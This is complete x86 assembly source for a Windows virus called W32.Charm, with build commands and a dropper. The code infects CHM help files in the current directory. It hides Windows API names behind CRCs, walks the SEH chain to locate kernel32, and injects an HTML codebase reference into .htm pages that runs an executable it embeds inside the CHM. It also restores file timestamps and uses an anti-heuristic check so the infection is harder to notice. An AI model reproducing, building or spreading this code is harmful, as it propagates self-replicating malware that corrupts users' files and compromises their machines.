comment ;)
W32.Charm by roy g biv

- parasitic direct action infector of CHM files
- infects files in current directory only
- two-stage approach, by adding codebase to htm files and inserting exe file
- uses CRCs instead of API names
---

to build this thing:
tasm
----
tasm32 /ml /m3 charm
tlink32 /B:400000 /x charm,,,import32

Virus is not self-modifying, so no need to alter section attributes

(;

.386
.model  flat

extern  CreateFileW:proc
extern  GetTickCount:proc
extern  WriteFile:proc
extern  CloseHandle:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include charm.inc

dropper         label   near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, olecrc_count
        mov     ebx, offset olenames
        mov     edi, offset olecrcbegin
        call    create_crcs
        xor     ebp, ebp
        push    ebp
        push    ebp
        push    CREATE_ALWAYS
        push    ebp
        push    ebp
        push    GENERIC_WRITE
        push    offset exename
        call    CreateFileW
        push    eax
        push    eax
        push    esp
        push    offset charm_codeend - offset charm_begin + exesize + 1ffh
        push    offset charm_hdr
        push    eax
        call    WriteFile
        call    CloseHandle
        xor     eax, eax
        push    eax
        push    offset txttitle
        push    offset txtbody
        push    eax
        call    MessageBoxA
        call    ExitProcess
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

exesize equ     94h
charm_hdr       label   near
        db      'M', 'Z'                ;00
        db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
        db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
        dw      14ch                    ;10 04 machine (overload for forwarder chain)
        dw      1                       ;12 06 number of sections (overload for forwarder chain)
        dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
        dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
        db      "rgb!"                  ;1c 10 number of symbols
        dw      40h                     ;20 14 size of optional header
        dw      30fh                    ;22 16 characteristics
        dw      10bh                    ;24 18 magic
        db      'r'                     ;26 1a major linker
        db      'r'                     ;27 1b minor linker
        dd      0                       ;28 1c size of code (overload for import table terminator)
        dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
        dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
        dd      exesize + 1000h         ;34 28 entry point
        db      "rgb!"                  ;38 2c base of code
        dd      0ch                     ;3c 30 base of data (overload for lfanew)
        dd      400000h                 ;40 34 image base
        dd      1000h                   ;44 38 section align
        dd      200h                    ;48 3c file align
        db      "rg"                    ;4c 40 major os
        db      "b!"                    ;4e 42 minor os
        db      "rg"                    ;50 44 major image
        db      "b!"                    ;52 46 minor image
        dw      4                       ;54 48 major subsys
        dw      0                       ;56 4a minor subsys (overload for import name table)
        db      "Arc", 0                ;58 4c reserved (overload for import name table)
        dd      (offset charm_codeend - offset charm_begin + exesize + 1fffh) and not 0fffh
                                        ;5c 50 size of image
        dd      exesize                 ;60 54 size of headers
        dd      0                       ;64 58 checksum (overload for section name)
        dw      2                       ;68 5c subsystem (overload for section name)
        dw      0                       ;6a 5e dll characteristics (overload for section name)
        dd      1                       ;6c 60 size of stack reserve (overload for virtual size)
        dd      1000h                   ;70 64 size of stack commit (overload for virtual address)
        dd      (offset charm_codeend - offset charm_begin + exesize + 1ffh) and not 1ffh
                                        ;74 68 size of heap reserve (overload for file size)
        dd      1                       ;78 6c size of heap commit (overload for file offset)
        db      "rgb!"                  ;7c 70 loader flags (overload for pointer to relocs)
        dd      2                       ;80 74 number of rva and sizes (overload for pointer to line numbers)
        dd      0                       ;84 78 export (overload for reloc table and line numbers)
        dd      0e0000000h              ;88 7c export (overload for section characteristics)
        dd      1008h                   ;8c 80 import
        dd      0                       ;90 84 import
                                        ;94

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

charm_begin     proc    near
        mov     dword ptr ds:[40102ch], 56h     ;restore overwritten entry
        xor     esi, esi
        lods    dword ptr fs:[esi]
        push    eax
        mov     dword ptr fs:[esi - 4], esp
        inc     eax

walk_seh        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     walk_seh
        enter   size STATSTG + size WIN32_FIND_DATAW - 4, 0
                                                ;-4 because EBP saved automatically
        lods    dword ptr [esi]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset check_ole - offset krncrcend + 4
        db      "CHarM - roy g biv"             ;don't press F1! ;)

init_findmz     label   near
        inc     eax
        xchg    edi, eax

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     find_mzhdr
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

exename dw      ".", "e", "x", "e", 0

;-----------------------------------------------------------------------------
;get OLE32 APIs
;-----------------------------------------------------------------------------

check_ole       label   near
        call    load_ole
        db      "ole32", 0

load_ole        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA - (olecrc_count shl 2)]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

olecrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (olecrc_count + 1) dup (0)
olecrcend       label   near
        dd      offset oleinit - offset olecrcend + 4

;-----------------------------------------------------------------------------
;initialise ITSS support
;-----------------------------------------------------------------------------

oleinit         label   near
        lea     ebp, dword ptr [esp + size krncrcstk - 4]
        xor     ebx, ebx
        push    ebx
        call    dword ptr [ebp + krncrcstk.oCoInitialize - size krncrcstk]
        push    eax
        push    esp
        call    skip_riid
        CLSID   <88CC31DEh, 27ABh, 11D0h, 9Dh, 0F9h, 00, 0A0h, 0C9h, 22h, 0E6h, 0ECh>

skip_riid       label   near
        push    CLSCTX_INPROC_SERVER
        push    ebx
        call    skip_rclsid
        CLSID   <5D02926Ah, 212Eh, 11D0h, 9Dh, 0F9h, 00, 0A0h, 0C9h, 22h, 0E6h, 0ECh>

skip_rclsid     label   near
        call    dword ptr [ebp + krncrcstk.oCoCreateInstance - size krncrcstk]
        pop     esi
        lea     eax, dword ptr [ebp + size STATSTG]
        push    eax
        call    skip_mask
        dw      "*", ".", "c", "h", "m", 0

;-----------------------------------------------------------------------------
;find some CHM files
;-----------------------------------------------------------------------------

skip_mask       label   near
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW - size krncrcstk]
        inc     eax
        je      charm_exit
        dec     eax
        push    eax

;-----------------------------------------------------------------------------
;check for infection marker (read-only file attrributes)
;-----------------------------------------------------------------------------

enum_file       label   near
        bts     dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.dwFileAttributes], ebx
        jb      find_next
        push    esi
        call    infect_file                     ;Super Nashwan power ;)
        push    dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.dwFileAttributes]
        lea     eax, dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.cFileName]
        push    eax
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    FILE_SHARE_READ
        push    GENERIC_WRITE
        push    eax
        call    dword ptr [ebp + krncrcstk.kCreateFileW - size krncrcstk]
        push    eax
        lea     ecx, dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.ftLastWriteTime]
        push    ecx
        sub     ecx, 8
        push    ecx
        sub     ecx, 8
        push    ecx
        push    eax
        call    dword ptr [ebp + krncrcstk.kSetFileTime - size krncrcstk]
        call    dword ptr [ebp + krncrcstk.kCloseHandle - size krncrcstk]
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW - size krncrcstk]
        pop     esi

find_next       label   near
        pop     eax
        push    eax
        lea     ecx, dword ptr [ebp + size STATSTG]
        push    ecx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindNextFileW - size krncrcstk]
        test    eax, eax
        jne     enum_file
        call    dword ptr [ebp + krncrcstk.kFindClose - size krncrcstk]
                                                ;game over

charm_exit      label   near
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Release]
        call    dword ptr [ebp + krncrcstk.oCoUninitialize - size krncrcstk]
        call    dword ptr [ebp + krncrcstk.kExitProcess - size krncrcstk]

;-----------------------------------------------------------------------------
;infect file
;algorithm:     for each file whose suffix is ".htm", add codebase reference
;               when entire file is processed, add exe file.  so simple
;-----------------------------------------------------------------------------

infect_file     proc    near
        push    eax
        push    esp
        push    ebx
        push    ebx
        push    STGM_READ or STGM_SHARE_EXCLUSIVE
        push    ebx
        lea     eax, dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.cFileName]
        push    eax
        push    esi
        mov     eax, dword ptr [esi]
        call    dword ptr [eax + StgOpenStorage]
        test    eax, eax
        jne     infect_ret
        push    "c"
        mov     eax, esp
        push    esp
        push    ebx
        push    STGM_WRITE or STGM_SHARE_EXCLUSIVE
        push    eax
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + StgCreateDocfile]
        test    eax, eax
        je      enum_first
        pop     eax

infect_ret      label   near
        pop     eax
        ret
        db      "05/04/05"

test_stg        label   near
        mov     edi, dword ptr [ebp + STATSTG.pwcsName]
        cmp     edi, ebx
        je      enum_next

;-----------------------------------------------------------------------------
;handle storages and streams only, discard all else
;-----------------------------------------------------------------------------

test_str        label   near
        mov     ecx, dword ptr [ebp + STATSTG.type]
        jecxz   free_next
        dec     ecx
        loopne  free_next
        inc     ecx
        sete    cl
        push    eax
        mov     eax, esp
        push    ecx
        push    eax
        push    ebx
        jne     skip_exclude

;-----------------------------------------------------------------------------
;OpenStorage() requires extra parameter
;-----------------------------------------------------------------------------

        push    ebx

skip_exclude    label   near
        push    STGM_READ or STGM_SHARE_EXCLUSIVE
        push    ebx
        push    edi
        mov     esi, dword ptr [ecx * 4 + esp + 2ch]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [ecx * 8 + eax + OpenStream]
        pop     ecx
        push    eax
        mov     eax, esp
        push    ecx
        push    eax
        push    ebx
        push    ebx
        push    STGM_WRITE or STGM_SHARE_EXCLUSIVE
        push    edi
        mov     esi, dword ptr [esp + 2ch]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [ecx * 8 + eax + CreateStream]
        pop     ecx
        loop    handle_str

;-----------------------------------------------------------------------------
;enter storage and continue parsing (non-recursive algorithm)
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esp + 10h]

enum_first      label   near
        inc     eax
        push    eax
        push    edi
        push    eax
        push    esp
        push    ebx
        push    ebx
        push    ebx
        mov     esi, dword ptr [esp + 20h]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + EnumElements]
        jmp     enum_next

free_next       label   near
        push    edi
        call    dword ptr [ebp + krncrcstk.oCoTaskMemFree - size krncrcstk]

enum_next       label   near
        pop     esi
        push    esi
        push    ebx
        push    ebp
        push    1
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Next]
        xchg    ecx, eax
        loop    test_stg
        pop     esi
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Release]
        pop     edi

release_str     label   near
        pop     ecx
        pop     esi
        push    ecx
        loop    skip_exe

;-----------------------------------------------------------------------------
;add exe file as final step
;-----------------------------------------------------------------------------

        push    esi
        push    eax
        push    esp
        push    ebx
        push    ebx
        push    STGM_WRITE or STGM_SHARE_EXCLUSIVE
        push    offset exename - offset charm_begin + exesize + 401000h
        push    esi
        mov     eax, dword ptr [esi]
        call    dword ptr [eax + CreateStream]
        pop     esi
        push    ebx
        push    offset charm_codeend - offset charm_begin + exesize + 1ffh
        push    401000h
        push    esi
        mov     eax, dword ptr [esi]
        call    dword ptr [eax + Write]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Release]
        pop     esi

skip_exe        label   near
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Release]
        pop     ecx
        pop     esi
        push    ecx
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Release]
        pop     ecx
        loop    free_next

;-----------------------------------------------------------------------------
;replace original file with infected file
;-----------------------------------------------------------------------------

        push    "c"
        mov     eax, esp
        push    MOVEFILE_REPLACE_EXISTING or MOVEFILE_WRITE_THROUGH
        lea     ecx, dword ptr [ebp + size STATSTG + WIN32_FIND_DATAW.cFileName]
        push    ecx
        push    eax
        call    dword ptr [ebp + krncrcstk.kMoveFileExW - size krncrcstk]
        pop     eax
        ret

;-----------------------------------------------------------------------------
;copy stream data
;-----------------------------------------------------------------------------

handle_str      label   near
        push    ebx
        mov     esi, dword ptr [ebp + STATSTG.cbSize]
        push    esi
        push    ebx
        call    dword ptr [ebp + krncrcstk.kGlobalAlloc - size krncrcstk]
        push    eax
        push    ebx
        push    esi
        push    eax
        push    dword ptr [esp + 14h]
        push    ebx
        push    esi
        push    eax
        mov     esi, dword ptr [esp + 28h]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Read]
        pop     esi
        push    esi
        mov     eax, dword ptr [esi]
        call    dword ptr [eax + Write]
        call    dword ptr [ebp + krncrcstk.kGlobalFree - size krncrcstk]
        push    edi
        call    dword ptr [ebp + krncrcstk.klstrlenW - size krncrcstk]
        xchg    ecx, eax
        mov     eax, dword ptr [ecx * 2 + edi - 8]
        or      eax, 00200020h
        cmp     eax, 0068002eh
        jne     branch_release
        mov     eax, dword ptr [ecx * 2 + edi - 4]
        or      eax, 00200020h
        cmp     eax, 006d0074h
        jne     branch_release

;-----------------------------------------------------------------------------
;if suffix is ".htm", add codebase reference
;-----------------------------------------------------------------------------

        push    ebx
        push    offset codebase_e - offset codebase_b
        call    skip_codebase
codebase_b      label   near
        db      "<object classid='clsid:1baddeed'codebase='.exe'></object>"
codebase_e      label   near

skip_codebase   label   near
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + Write]

branch_release  label   near
        jmp     release_str
        db      "*4U2NV*"                       ;that is, unless you're reading this
infect_file     endp
charm_codeend   label near
charm_begin     endp
        db      (offset charm_codeend - offset charm_begin + exesize + 1ffh) dup (0)

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"       , 0
                db      "CreateFileW"       , 0
                db      "ExitProcess"       , 0
                db      "FindClose"         , 0
                db      "FindFirstFileW"    , 0
                db      "FindNextFileW"     , 0
                db      "GlobalAlloc"       , 0
                db      "GlobalFree"        , 0
                db      "LoadLibraryA"      , 0
                db      "MoveFileExW"       , 0
                db      "SetFileAttributesW", 0
                db      "SetFileTime"       , 0
                db      "lstrlenW"          , 0

olenames        db      "CoCreateInstance", 0
                db      "CoInitialize"    , 0
                db      "CoTaskMemFree"   , 0
                db      "CoUninitialize"  , 0

txttitle        db      "Charm", 0
txtbody         db      "now run .exe", 0

.code
        nop
end             dropper
